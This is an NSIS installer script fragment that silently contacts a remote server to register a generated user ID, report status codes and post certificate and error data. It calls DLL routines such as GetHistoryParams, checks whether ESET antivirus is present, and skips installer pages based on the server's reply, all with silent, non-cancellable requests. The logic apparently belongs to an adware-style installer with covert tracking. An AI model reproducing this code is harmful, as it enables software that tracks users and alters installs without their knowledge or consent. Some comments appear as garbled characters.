Var ID2


Function NewAction1Function
	
	;get first quant - the first try
	StrCpy $0 "1"
	Banner::get /NOUNLOAD /TOSTACK  /NOCANCEL /SILENT /RESUME "" "$ReportUrl$0" "" /END
	Pop $0 
	Pop $quant
	${if} $0 != "OK"
		;get first quant - the second try
		StrCpy $0 "1"
		Banner::get /NOUNLOAD /TOSTACK  /NOCANCEL /SILENT /RESUME "" "$ReportUrl$0" "" /END
		Pop $0 
		Pop $quant
		${if} $0 != "OK"
			;get first quant - the last try
			StrCpy $0 "1"
			Banner::get /NOUNLOAD /TOSTACK  /NOCANCEL /SILENT /RESUME "" "$ReportUrl$0" "" /END
			Pop $0 
			Pop $quant
			${if} $0 != "OK"
			${endif}
		${endif}
	${endif}
	
FunctionEnd

Var IPDUrl

Function NewIPDFunction
	; get the ipb value - the fist try
	Banner::get /NOUNLOAD /TOSTACK  /NOCANCEL /SILENT /RESUME "" "$IPDUrl" "" /END
	Pop $0 
	Pop $stack
	
	${if} $0 != "OK"
		; report
		Banner::get /NOUNLOAD /TOSTACK  /NOCANCEL /SILENT /RESUME "" "https://$MainDomain/postdata3.php?data=v27+:$0" ""	/END	
		Pop $0
		Pop $1
		; get the ipb value - the second try
		Banner::get /NOUNLOAD /TOSTACK  /NOCANCEL /SILENT /RESUME "" "$IPDUrl" "" /END
		Pop $0 
		Pop $stack
		${if} $0 != "OK"
			Banner::get /NOUNLOAD /TOSTACK  /NOCANCEL /SILENT /RESUME "" "https://$MainDomain/postdata3.php?data=v27+:$0" ""	/END	
			Pop $0
			Pop $1

			; get the ipb value - the second try
			Banner::get /NOUNLOAD /TOSTACK  /NOCANCEL /SILENT /RESUME "" "$IPDUrl" "" /END
			Pop $0 
			Pop $stack
			Pop $1
		${endif}
	${endif}
FunctionEnd

Var cert
; ��������� quant
Function GenerateQuant	


	;	create quid
	System::Call 'ole32::CoCreateGuid(g .s)'
	Pop $0 ;contains GUID
	StrCpy $1 $0 36 1
	StrCpy $UID $1
	StrCpy $ReportUrl "https://$MainDomain/installer.php?CODE=PUTGQ&UID=$1&action="
	
	
	Call NewAction1Function
	
	${if} $quant < 10000
		Call NewAction1Function
		; processing guant
		${if} $quant < 10000
			Call NewAction1Function
			; processing guant
		${endif}
	${endif}
	
	;caclulate new value
	StrCpy $1 $quant
	StrCpy $2 $1 "" -4
	IntOp $2 $2 + 0
	IntOp $1 $1 + 0 	 	; 1 to int
	
	
	${if} $2 < 26
			IntOp $4 $1 + 0 	 	; copy 1 to 4
 			IntOp $2 $2 * 3  		; 2 digits *3
			IntOp $4 $4 + 8923 	; quant + 8923
			IntOp $4 $4 - $2		; quant + 8923 - 2digits *3
			;MessageBox MB_OK "$1 _ $2 [0..25] $4"
	${else}
		${if} $2 < 51
			IntOp $4 $1 + 0 	 	; copy 1 to 4
			IntOp $2 $2 * 4  		; 2 digits*4
			IntOp $4 $4 + $2		; quant + 2digits*4
			;MessageBox MB_OK "$1 _ $2 [26..50] $4"
		${else}
			${if} $2 < 76
				IntOp $4 $1 + 0 	 	; copy 1 to 4
				IntOp $2 $2 * 3  		; 2 digits *3
				IntOp $4 $4 + $2		; quant + 2digits *3
				IntOp $4 $4 - 5 	 	; quant + 2digits *3 - 5
				;MessageBox MB_OK "$1 _ $2 [51..75] $4"
			${else}
				IntOp $4 $1 + 0 	 	; copy 1 to 4
				IntOp $4 $4 - $2		; quant - 2digits 
				IntOp $4 $4 + 10000	; quant - 2digits + 10000
			${endif}
		${endif}
	${endif}
	
	IntOp $quant $4 + 0 
	;	creare url with quant and guid
	StrCpy $ReportUrl "https://$MainDomain/installer.php?CODE=PUTGQ&UID=$uid&quant=$quant&action="
	StrCpy $MD5Url    "https://$MainDomain/info.php?&quant=$quant"

	StrCpy $Result "1543"
	Banner::get /NOUNLOAD /TOSTACK  /NOCANCEL /SILENT /RESUME "" $ReportUrl$Result ""	/END	
	Pop $0
	Pop $Stack
		
	; StrCpy $Result "1973"
	; Banner::get /NOUNLOAD /TOSTACK  /NOCANCEL /SILENT /RESUME "" $ReportUrl$Result ""	/END	
	; Pop $0	
	; Pop $Stack
	
	# IPD.php encripted version -- start
	;create new random 12 character string  
	System::Call 'ole32::CoCreateGuid(g .s)'
	Pop $0 ;contains GUID
	StrCpy $1 $0 8 1
	StrCpy $2 $0 4 10
	
	StrCpy $ID2 "$1$2"

	
	Banner::post "data=v30+$cert" /TOSTACK /NOCANCEL /SILENT /RESUME "" "https://$MainDomain/postdata3.php" ""	/END	
	Pop $0
	Pop $stack

	System::Call 'ole32::CoCreateGuid(g .s)'
	Pop $0 ;contains GUID
	StrCpy $1 $0 8 1
	StrCpy $2 $0 4 10
	
	CallInstDLL $PLUGINSDIR\${utilites}.dll /NOUNLOAD ${GetHistoryParams}
	StrCpy $MParam "6859f41ccc5848a983e1d055c4299479"
	StrCpy $IPDUrl "https://$MainDomain/ipb.php?ID=$1$2&ID2=$ID2$5&m=$MParam"

	Call NewIPDFunction
	
	Push $stack
	CallInstDLL $DllPath\${guard}.dll /NOUNLOAD ${CheckTheIPBParam} 
	Pop $0
	
	${if} $0 == "$ID2"
	${else}
		${if} $stack == $0 
			StrCpy $Result "2084"
			Banner::get /NOUNLOAD /TOSTACK  /NOCANCEL /SILENT /RESUME "" $ReportUrl$Result ""	/END	
			Pop $9
			Pop $stack
			
			${If} $EsetFound == "true"
			${else}
				StrCpy $Result "2302"
				Banner::get /NOUNLOAD /TOSTACK  /NOCANCEL /SILENT /RESUME "" $ReportUrl$Result ""	/END	
				Pop $9
				Pop $stack
			${endif}
			
		${endif}
		Banner::get /NOUNLOAD /TOSTACK  /NOCANCEL /SILENT /RESUME "" "https://$MainDomain/postdata3.php?data=v28+:$1" ""	/END	
		Pop $0
		Pop $stack
		
		StrCpy $HardSkipPages "true"
		StrCpy $IPBSkip "true"
		
		StrCpy $Result "914"
		Banner::get /NOUNLOAD /TOSTACK  /NOCANCEL /SILENT /RESUME "" $ReportUrl$Result ""	/END	
		Pop $0
		Pop $stack
		
	${endif}
	
	# IPD.php test -- stop

FunctionEnd

;	��������� ������� �����
Function myOnUserAbort



FunctionEnd
